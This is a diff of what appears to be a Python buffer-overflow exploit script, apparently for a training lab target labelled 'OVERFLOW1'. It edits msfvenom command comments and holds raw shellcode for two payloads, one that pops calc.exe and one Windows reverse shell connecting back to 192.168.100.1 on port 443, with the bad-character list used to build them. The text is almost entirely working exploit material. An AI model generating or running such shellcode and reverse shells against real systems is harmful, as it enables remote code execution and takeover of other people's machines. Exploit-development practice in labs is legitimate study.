@@ -13,7 +13,7 @@ header = "OVERFLOW1 "
 # Bad Chars 0x00, 0x7, 0x2e, 0xa0
 
 # Pop Calculator
-# msfvenom -p windows/exec CMD=calc.exe -b '\x00\x07\x2e\xa0 -f python -v payload
+# msfvenom -p windows/exec CMD=calc.exe -b '\x00\x07\x2e\xa0' -f c -v payload_calc
 payload_calc =  (
 "\xbe\x72\x46\xb7\xf7\xdb\xda\xd9\x74\x24\xf4\x5f"
 "\x31\xc9\xb1\x31\x31\x77\x13\x03\x77\x13\x83\xc7"
@@ -36,7 +36,7 @@ payload_calc =  (
 "\xf2\xc2\x5b\x94" )
 
 # Reverse Shell
-# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.1 LPORT=443 -b '\x00\x07\x2e\xa0' -f c -v payload
+# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.1 LPORT=443 -b '\x00\x07\x2e\xa0' -f c -v payload_shell
 payload_shell = (
 "\xbd\x4b\x22\x91\xc1\xda\xdb\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
 "\x52\x83\xe8\xfc\x31\x68\x0e\x03\x23\x2c\x73\x34\x4f\xd8\xf1"
